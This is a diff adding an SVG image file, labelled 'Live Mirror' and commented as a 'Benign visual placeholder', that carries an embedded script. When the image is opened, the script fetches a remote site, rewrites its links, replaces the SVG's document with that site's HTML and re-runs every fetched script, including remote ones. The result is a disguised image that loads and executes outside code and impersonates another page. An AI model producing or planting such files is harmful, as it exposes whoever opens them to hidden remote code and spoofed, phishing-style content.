@@ -1,0 +1,54 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100%" height="100%">
+  <!-- Benign visual placeholder -->
+  <circle cx="50" cy="50" r="40" fill="#4f46e5" />
+  <text x="50" y="55" font-size="8" fill="white" text-anchor="middle" font-family="sans-serif">Live Mirror</text>
+
+  <script type="text/javascript">
+    <![CDATA[
+      // Define the target domain you want to mirror
+      const targetDomain = 'https://example.com';
+
+      fetch(targetDomain)
+        .then(response => response.text())
+        .then(htmlString => {
+          // Parse the fetched HTML text into a temporary document
+          const parser = new DOMParser();
+          const targetDoc = parser.parseFromString(htmlString, 'text/html');
+
+          // Helper function to resolve relative paths (e.g., /style.css -> https://example.com/style.css)
+          const resolveUrl = (attrName, element) => {
+            const val = element.getAttribute(attrName);
+            if (val && !val.startsWith('http://') && !val.startsWith('https://') && !val.startsWith('//') && !val.startsWith('data:')) {
+              // Construct absolute URL based on the target domain
+              const absoluteUrl = new URL(val, targetDomain).href;
+              element.setAttribute(attrName, absoluteUrl);
+            }
+          };
+
+          // Rewrite URLs for links, stylesheets, scripts, and images
+          targetDoc.querySelectorAll('link[href]').forEach(el => resolveUrl('href', el));
+          targetDoc.querySelectorAll('a[href]').forEach(el => resolveUrl('href', el));
+          targetDoc.querySelectorAll('script[src]').forEach(el => resolveUrl('src', el));
+          targetDoc.querySelectorAll('img[src]').forEach(el => resolveUrl('src', el));
+
+          // Replace the current SVG document's content with the mirrored HTML
+          document.documentElement.innerHTML = targetDoc.documentElement.innerHTML;
+
+          // Re-execute scripts so the page remains interactive
+          const scripts = document.documentElement.querySelectorAll('script');
+          scripts.forEach(oldScript => {
+            const newScript = document.createElement('script');
+            if (oldScript.src) {
+              newScript.src = oldScript.src;
+            } else {
+              newScript.textContent = oldScript.textContent;
+            }
+            document.head.appendChild(newScript).parentNode.removeChild(newScript);
+          });
+        })
+        .catch(err => {
+          console.error('Error mirroring the site:', err);
+        });
+    ]]>
+  </script>
+</svg>
